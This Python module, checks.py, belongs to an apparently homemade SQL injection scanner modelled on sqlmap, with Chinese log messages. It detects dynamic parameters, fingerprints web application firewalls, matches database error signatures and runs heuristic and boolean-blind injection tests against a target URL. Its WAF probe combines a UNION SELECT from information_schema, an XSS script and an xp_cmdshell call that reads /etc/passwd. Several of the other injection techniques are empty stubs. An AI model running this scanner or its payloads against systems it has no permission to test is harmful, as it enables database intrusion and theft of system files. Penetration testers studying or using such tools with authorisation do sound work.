#!/usr/bin/env python 
# -*- coding: utf-8 -*- 
# @Author : su18
# @Copyright : phoebebuffayfan9527@gmail.com
# @Time  : 2019-07-11 17:32
# @FileName: checks.py

import re
import sys
import json
import time
import socket
import codecs
from core.data import conf
from core.data import paths
from core.data import queries
from core.data import logger
from core.data import byz
from core.data import payloads
from core.common import random_int
from core.common import random_str
from core.common import html_unescape
from core.common import payload_handler
from core.common import check_page_similarity
from core.common import find_dynamic_content
from core.common import remove_dynamic_content
from core.connect import Request


def check_connection():
    """
    检查页面连通性
    :return:
    """
    # 对目标域名进行DNS解析
    logger.info("正在解析目标域名")
    ip = host_resolv(conf.TARGET['domain'])

    if conf.HOST:
        if ip != conf.HOST:
            logger.info("域名解析IP与指定IP不同，请注意")

    logger.info("正在检查页面连通性")
    Request.get_page(original=True)
    if queries['original']['code'] != 200 or queries['original']['text']:
        logger.info("页面连通性正常")
    else:
        logger.error("检查页面连通性出错：%s" % conf.TARGET['url'])
        sys.exit()


def check_stable():
    logger.info("正在检查页面稳定性")

    # 进行一定的延时
    delay = 1 - queries['original']['time']
    delay = max(0, min(1, delay))
    time.sleep(delay)

    # 再次请求相同的页面，排除动态页面
    try:
        count = Request.get_page()
        find_dynamic_content(queries['original']['ori_text'], queries[count]['ori_text'])
        byz.original_page = remove_dynamic_content(queries['original']['ori_text'])
    except ConnectionError:
        logger.error('页面连接不稳定，请稍后重试')


def check_dynamic():
    logger.info("正在检查参数动态性")
    # get 方法参数在 url 中

    if conf.METHOD.lower() != 'post':
        for i in conf.TARGET['query']:

            similarity1 = Request.query_page(i, str(random_int()), _return='similarity')

            similarity2 = Request.query_page(i, str(random_int()), _return='similarity')

            if not similarity1:
                if not similarity2:
                    byz.dynamic_params.append(i)
    else:
        # 如果是 POST 方法
        pass


def check_waf():
    """
    发送触发WAF payload
    :return:
    """
    check_waf_payload = " AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',table_name FROM " \
                        "information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell(\'cat ../../../etc/passwd\')#"
    logger.info("正在检查目标是否受到WAF防护")
    try:
        url = conf.TARGET['url'] + check_waf_payload
        count = Request.get_page(url=url)
        check_waf_regex = load_check_waf_json()
        non_blind_check(queries[count]['text'], check_waf_regex)
    except Exception as reason:
        logger.error("连接出错，带有攻击性的请求可能被重置：%s" % reason)


def load_check_waf_json():
    """
    加载waf指纹json
    :return:
    """
    waf_json = {}
    signatures = {}

    with codecs.open(paths.WAF_FILE, "rb", encoding="utf8") as f:
        waf_json.update(json.load(f))

    check_waf_regex = ""

    for waf in waf_json["wafs"]:
        if waf_json["wafs"][waf]["regex"]:
            check_waf_regex += "%s|" % ("(?P<waf_%s>%s)" % (waf, waf_json["wafs"][waf]["regex"]))
        for signature in waf_json["wafs"][waf]["signatures"]:
            signatures[signature] = waf
    check_waf_regex = check_waf_regex.strip('|')

    flags = "".join(set(_ for _ in "".join(re.findall(r"\(\?(\w+)\)", check_waf_regex))))
    check_waf_regex = "(?%s)%s" % (flags, re.sub(r"\(\?\w+\)", "", check_waf_regex))

    return check_waf_regex


def non_blind_check(raw, check_waf_regex):
    """
    使用正则检测网站响应包中是否命中waf指纹
    :param raw:
    :param check_waf_regex:
    :return:
    """
    match = re.search(check_waf_regex, raw or "")
    if match:
        for _ in match.groupdict():
            if match.group(_) is not None:
                waf = re.sub(r"\Awaf_", "", _)
                logger.warning("检测到目标正在受到以下WAF的防御：%s" % waf)
                logger.warning("接下来的攻击PAYLOAD可能被重置")
    else:
        logger.info("未检测到WAF指纹")


def host_resolv(host):
    """
    根据域名解析DNS
    :param host:
    :return:
    """
    ip = None
    try:
        family, socktype, proto, canonname, sockaddr = socket.getaddrinfo(
            host, 0, socket.AF_UNSPEC, socket.SOCK_STREAM)[0]

        if family == socket.AF_INET:
            ip, port = sockaddr
        elif family == socket.AF_INET6:
            ip, port, flow_info, scope_id = sockaddr
    except Exception as reason:
        logger.error("DNS解析出错，网站连通性可能存在问题：%s" % reason)
        sys.exit()
    return ip


def extract_error_message(page):
    """
    检查页面是否出现数据库报错信息，如果有，则返回True
    :param page:
    :return:
    """
    ret_val = None

    error_parsing_regexes = (
        r"\[Microsoft\]\[ODBC SQL Server Driver\]\[SQL Server\](?P<result>[^<]+)",
        r"<b>[^<]*(fatal|error|warning|exception)[^<]*</b>:?\s*(?P<result>[^<]+)",
        r"(?m)^\s*(fatal|error|warning|exception):?\s*(?P<result>[^\n]+?)$",
        r"(sql|dbc)[^>'\"]{0,32}(fatal|error|warning|exception)(</b>)?:\s*(?P<result>[^<>]+)",
        r"(?P<result>[^\n>]*SQL Syntax[^\n<]+)",
        r"(?s)<li>Error Type:<br>(?P<result>.+?)</li>",
        r"CDbCommand (?P<result>[^<>\n]*SQL[^<>\n]+)",
        r"error '[0-9a-f]{8}'((<[^>]+>)|\s)+(?P<result>[^<>]+)",
        r"\[[^\n\]]+(ODBC|JDBC)[^\n\]]+\](\[[^\]]+\])?(?P<result>[^\n]+(in query expression|\(SQL| at /[^ ]+pdo)[^\n<]+)",
        r"(?P<result>query error: SELECT[^<>]+)"
    )

    if isinstance(page, str):

        page = re.sub(r"<[^>]+>", "", page)

        for regex in error_parsing_regexes:
            match = re.search(regex, page, re.IGNORECASE)

            if match:
                candidate = html_unescape(match.group("result")).replace("<br>", "\n").strip()
                if candidate and (1.0 * len(re.findall(r"[^A-Za-z,. ]", candidate)) / len(candidate) > 0.05):
                    ret_val = candidate
                    break

    return ret_val


def extract_error_dbms(page):
    sql_errors = {
        "MySQL": (r"SQL syntax.*MySQL",
                  r"Warning.*mysql_.*",
                  r"MySQL Query fail.*",
                  r"SQL syntax.*MariaDB server"),
        "PostgreSQL": (r"PostgreSQL.*ERROR",
                       r"Warning.*\Wpg_.*",
                       r"Warning.*PostgreSQL"),
        "Microsoft SQL Server": (r"OLE DB.* SQL Server",
                                 r"(\W|\A)SQL Server.*Driver",
                                 r"Warning.*odbc_.*",
                                 r"Warning.*mssql_",
                                 r"Msg \d+, Level \d+, State \d+",
                                 r"Unclosed quotation mark after the character string",
                                 r"Microsoft OLE DB Provider for ODBC Drivers"),
        "Microsoft Access": (r"Microsoft Access Driver",
                             r"Access Database Engine",
                             r"Microsoft JET Database Engine",
                             r".*Syntax error.*query expression"),
        "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]",
                   r"Oracle error",
                   r"Warning.*oci_.*",
                   "Microsoft OLE DB Provider for Oracle"),
        "IBM DB2": (r"CLI Driver.*DB2",
                    r"DB2 SQL error"),
        "SQLite": (r"SQLite/JDBCDriver",
                   r"System.Data.SQLite.SQLiteException"),
        "Informix": (r"Warning.*ibase_.*",
                     r"com.informix.jdbc"),
        "Sybase": (r"Warning.*sybase.*",
                   r"Sybase message")
    }
    for db, errors in sql_errors.items():
        for error in errors:
            if re.compile(error).search(page):
                return True, db
    return False, None


def heuristic_check():
    if not byz.dynamic_params:
        logger.info("未检测到动态参数，程序退出")
        sys.exit()
    logger.info("正在进行启发性检测")

    format_exception = ("Type mismatch", "Error converting", "Please enter a", "Conversion failed",
                        "String or binary data would be truncated", "Failed to convert",
                        "unable to interpret text value", "Input string was not in a correct format",
                        "System.FormatException", "java.lang.NumberFormatException", "ValueError: invalid literal",
                        "TypeMismatchException", "CF_SQL_INTEGER", "CF_SQL_NUMERIC", " for CFSQLTYPE ",
                        "cfqueryparam cfsqltype", "InvalidParamTypeException", "Invalid parameter type",
                        "Attribute validation error for tag", "is not of type numeric",
                        "<cfif Not IsNumeric(", "invalid input syntax for integer", "invalid input syntax for type",
                        "invalid number", "character to number conversion error", "unable to interpret text value",
                        "String was not recognized as a valid", "Convert.ToInt", "cannot be converted to a ",
                        "InvalidDataException")

    def _(response_page):
        return any(_ in (response_page or "") for _ in format_exception)

    for i in byz.dynamic_params:
        rand_str = ""
        alphabet = ('"', '\'', ')', '(', ',', '.')

        while rand_str.count('\'') != 1 or rand_str.count('\"') != 1:
            rand_str = random_str(length=10, alphabet=alphabet)

        page, similarity = Request.query_page(i, rand_str)
        dbs_error = extract_error_message(page)

        # 检查页面是否出现 字符串格式化错误 提示
        casting = _(page) and not _(byz.original_page)

        if dbs_error:
            byz.injectable_params.append(i)
            logger.warning("启发性检测显示参数 %s 可能存在 SQL 注入" % i.split('=')[0])
            flags, db = extract_error_dbms(page)
            if flags:
                logger.warning("可能的后端 DBMS 为 %s" % db)
        elif not casting and i.split('=')[1].isdigit():
            rand_int = int(random_int())
            payload = "%d-%d" % (int(i.split('=')[1]) + rand_int, rand_int)
            similarity = Request.query_page(i, payload, _return='similarity')
            if similarity:
                byz.injectable_params.append(i)
                logger.warning("启发性检测显示参数 %s 可能存在 SQL 注入" % i.split('=')[0])

    if not byz.injectable_params:
        logger.info("启发性检测结果显示不存在可被注入参数")


def check_sql_injection():
    technique = list(conf.TECH)

    if not technique:
        technique = ['B', 'E', 'U', 'S', 'T', 'Q']

    for tech in technique:
        for i in byz.dynamic_params:

            # 检测布尔型盲注
            if tech == 'B':
                logger.info("正在检测 布尔型盲注 ")
                for k, v in payloads.items():
                    logger.info("正在进行第 %s 项检测：%s" % (k, v['desc']))
                    for _ in v['payload']:
                        logger.info("正在检测 %s " % _['type'])
                        for m in conf.BOUNDARIES:
                            if set(_['clause']).issubset(m['clause']) and _['where'] in m['where']:
                                target_url, compare_url = payload_handler(i, _, boundries=m)
                                count1, sim1 = Request.query_page(i, target_url, ready=True, _return='count')
                                count2, sim2 = Request.query_page(i, compare_url, ready=True, _return='count')
                                sim3 = check_page_similarity(count2, ori_page=count1)
                                if sim1 and not sim3:
                                    if not sim3:
                                        logger.warning("检测到SQL注入漏洞")
                                        logger.warning("注入方式: %s " % _['type'])
                                        logger.warning("注入payload：%s " % target_url)
                                        if _['dbms']:
                                            logger.warning("可能的数据库为：%s " % _['dbms'])
                                        if _['os']:
                                            logger.warning("可能的系统为： %s" % _['os'])
                                        sys.exit()

                        else:
                            target_url, compare_url = payload_handler(i, _)
                            count1, sim1 = Request.query_page(i, target_url, _return='count')
                            count2, sim2 = Request.query_page(i, compare_url, _return='count')
                            sim3 = check_page_similarity(count2, ori_page=count1)
                            if sim1 and not sim3:
                                if not sim3:
                                    logger.warning("检测到SQL注入漏洞")
                                    logger.warning("注入方式: %s " % _['type'])
                                    logger.warning("注入payload：%s " % target_url)
                                    if 'dbms' in _:
                                        logger.warning("可能的数据库为：%s " % _['dbms'])
                                    if 'os' in _:
                                        logger.warning("可能的系统为： %s" % _['os'])
                                    sys.exit()

            elif tech == 'E':
                pass
            elif tech == 'U':
                pass
            elif tech == 'S':
                pass
            elif tech == 'T':
                pass
            elif tech == 'Q':
                pass
            else:
                pass
